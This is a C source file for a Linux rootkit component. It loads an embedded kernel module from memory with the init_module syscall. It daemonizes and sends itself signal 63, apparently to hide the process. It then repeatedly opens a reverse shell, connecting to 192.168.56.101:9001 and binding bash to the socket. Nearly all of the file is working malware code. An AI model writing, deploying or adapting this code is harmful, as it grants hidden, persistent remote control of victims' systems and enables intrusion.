#define _GNU_SOURCE

#include <sched.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <sys/syscall.h>  
#include "rkit_ko.h" // create the  rkit_ko and rkit_ko_len dynamic

// Log helper
enum { LOG_BUF = 128 };
static void log_msg(const char *msg) {
    int fd = open("/var/log/volnaya.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) return;
    char buf[LOG_BUF];
    int len = snprintf(buf, sizeof(buf), "[%ld] %s\n", time(NULL), msg);
    write(fd, buf, len);
    close(fd);
}

// fork and exit parent, create new session and hidde process
static void daemonize(void) {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    if (setsid() < 0) {
        log_msg("setsid failed");
        exit(EXIT_FAILURE);
    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    kill(getpid(), 63);    

}

// In-memory module loading stub
static int load_module(void) {
    int ret = syscall(__NR_init_module, rkit_ko, rkit_ko_len, "");
    if (ret == 0) log_msg("Module loaded via init_module !!!");
    else {
        char buf[LOG_BUF];
        snprintf(buf, sizeof(buf), "init_module failed: %s", strerror(errno));
        log_msg(buf);
    }
    return ret;
}

int main(int argc, char **argv) {
    const char *ip = "192.168.56.101";
    int port = 9001;
    char logbuf[LOG_BUF];
    
    if (argc < 2) {
        fprintf(stderr, "Invalid command. Usage: %s [load|rsh]\n", argv[0]);
        return 1;
    }
    if (strcmp(argv[1], "load") == 0) {
        fprintf(stdout, "loading module");
        load_module();
        return 0;
    }

    if (strcmp(argv[1], "rsh") == 0) {
        fprintf(stdout, "starting shell\n");
        daemonize();
        while (1) {
            int s = socket(AF_INET, SOCK_STREAM, 0);
            if (s < 0) {
                snprintf(logbuf, sizeof(logbuf), "socket failed: %s", strerror(errno));
                log_msg(logbuf);
                sleep(5);       
                continue;     
            }
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            addr.sin_addr.s_addr = inet_addr(ip);
            snprintf(logbuf, sizeof(logbuf), "Connecting to %s:%d", ip, port);
            log_msg(logbuf);
            snprintf(logbuf, sizeof(logbuf), "About to call connect on s=%d", s);
            log_msg(logbuf);

            if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                log_msg("Connection established, spawning shell");            
                dup2(s, STDIN_FILENO);
                dup2(s, STDOUT_FILENO);
                dup2(s, STDERR_FILENO);
                execl("/bin/bash", "bash", NULL);
                snprintf(logbuf, sizeof(logbuf), "execl failed: %s", strerror(errno));
                log_msg(logbuf);
                close(s);
                sleep(5);
            } else {
                snprintf(logbuf, sizeof(logbuf), "connect failed: %s", strerror(errno));
                log_msg(logbuf);
                close(s);
                sleep(5);
            }
        }
        return 0;
    }
    return 1;
}

